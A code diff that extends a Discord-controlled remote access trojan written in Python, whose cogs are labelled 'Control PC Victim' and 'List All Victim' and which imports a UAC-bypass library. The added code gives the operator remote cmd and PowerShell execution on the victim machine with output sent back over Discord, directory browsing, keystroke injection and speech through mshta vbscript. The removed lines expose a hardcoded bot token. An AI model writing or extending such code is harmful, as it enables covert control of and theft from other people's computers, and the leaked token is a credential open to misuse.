@@ -5,6 +5,7 @@ import pygame.image
 import pygame.mixer
 import wavio as wv
 import sounddevice as sd
+from config import LoadsConfig
 from PIL import ImageGrab
 from core.info import Info
 from core.sender import Sender
@@ -18,7 +19,8 @@ from winpwnage.functions.uac.uacMethod1 import uacMethod1
 os.system('cls')
 pc = Info()
 PREFIX = '>'
-devmode = False
+devmode = True
+config = LoadsConfig()
 client = commands.Bot(command_prefix=commands.when_mentioned_or(PREFIX), intents = discord.Intents.all(), help_command=PrettyHelp())
 
 def CheckHWID(HWID):
@@ -29,7 +31,7 @@ def CheckHWID(HWID):
 
 async def SendOutput(ctx, output):
 	output_embed = discord.Embed(description=f'**__Output__**\n```\n{output}\n```')
-	await ctx.send(embed = output_embed)
+	await ctx.reply(embed = output_embed)
 
 async def safe(ctx):
 	if devmode:
@@ -228,22 +230,18 @@ class Control(commands.Cog, description='Control PC Victim'):
 
 		await SendOutput(ctx, 'Input has been unblocked!')
 
-	@commands.command(aliases=["kboard", "kb"], brief='Control Keyboard PC Victim', description='Control Keyboard PC Victim')
-	async def Keyboard(self, ctx, HWID: str, mode: str = 'type',  *, text = ''):
+	@commands.command(aliases=["kbtyping", "kbtping"], brief='Control Keyboard PC Victim', description='Control Keyboard PC Victim')
+	async def KeyboardTyping(self, ctx, HWID: str, delay: int = 0.1, *, text = ''):
 		if not CheckHWID(HWID):
 			return
-		# Key = keyboard.Key
-		# _key = {'enter': Key.enter, 'ctrl_l': Key.ctrl_}
 		keyboard_ = keyboard.Controller()
 		async def typing():
-			if mode == 'type':
-				# keyboard_.type(text)
-				for char in text:
-					keyboard_.press(char)
-					keyboard_.release(char)
-					time.sleep(0.1)
-			# elif mode == 'key':
+			for char in text:
+				keyboard_.press(char)
+				keyboard_.release(char)
+				time.sleep(delay)
 			await SendOutput(ctx, 'Done!')
+
 		def between_typing():
 			loop = asyncio.new_event_loop()
 			asyncio.set_event_loop(loop)
@@ -382,6 +380,52 @@ URL="""+ url +"""
 					mixer.music.unload()
 					break
 		threading.Thread(target = handle).start()
+
+	@commands.command(aliases=["speech"], brief='Text To Speech', description='Text To Speech')
+	async def Speech(self, ctx, HWID: str, *, text: str):
+		if not CheckHWID(HWID):
+			return
+		os.system(f'mshta vbscript:Execute("CreateObject(""SAPI.SpVoice"").Speak(""{text}"")(window.close)")')
+		await SendOutput(ctx, 'Done!')
+
+	@commands.command(aliases=["shell"], brief='The Shell (cmd, pwsh)', description='The Shell (cmd, pwsh)')
+	async def Shell(self, ctx, HWID: str, shell_type: str = 'cmd', *, command: str):
+		if not CheckHWID(HWID):
+			return
+
+		async def shell():
+			if shell_type == 'cmd':
+				output = str(subprocess.check_output(f'{command}', shell=True), 'utf-8')
+				await SendOutput(ctx, output)
+			elif shell_type == 'pwsh':
+				output = str(subprocess.check_output(f'powershell -Command "{command}"', shell=True), 'utf-8')
+				await SendOutput(ctx, output)
+
+		def between_shell():
+			loop = asyncio.new_event_loop()
+			asyncio.set_event_loop(loop)
+
+			loop.run_until_complete(shell())
+			loop.close()
+		threading.Thread(target = between_shell).start()
+
+	@commands.command(aliases=["cd"], brief='Change Directory', description='Change Directory')
+	async def Cd(self, ctx, HWID: str, *, path: str):
+		if not CheckHWID(HWID):
+			return
+		if not os.path.exists(path):
+			await SendOutput(ctx, 'Path Not Found!')
+			return
+		os.chdir(path)
+		await SendOutput(ctx, f"Changed Directory to {os.getcwd()}")
+
+	@commands.command(aliases=["dir", 'ls'], brief='List Item in Directory', description='List Item in Directory')
+	async def ListItemDirectory(self, ctx, HWID: str, *, path: str = '.'):
+		if not CheckHWID(HWID):
+			return
+
+		output = str(subprocess.check_output(f'dir {path}', shell=True), 'utf-8')
+		await SendOutput(ctx, output)
 				
 class OtherCommands(commands.Cog, description='Other Commands'):
 	@commands.command(aliases=['list'], brief='List All Victim', description='List All Victim')
@@ -412,4 +456,6 @@ async def on_ready():
 	await client.add_cog(Control())
 	await client.add_cog(OtherCommands())
 
-client.run('MTEyODk0MTcwMzAzNDgzNDk2NA.G8b_eP.UBMC8F2ETPzOMEof3XRtc_EdGhGoZv0hZrW-3c')
+print(config['bot']['token'])
+if devmode:
+	client.run(config['bot']['token'])
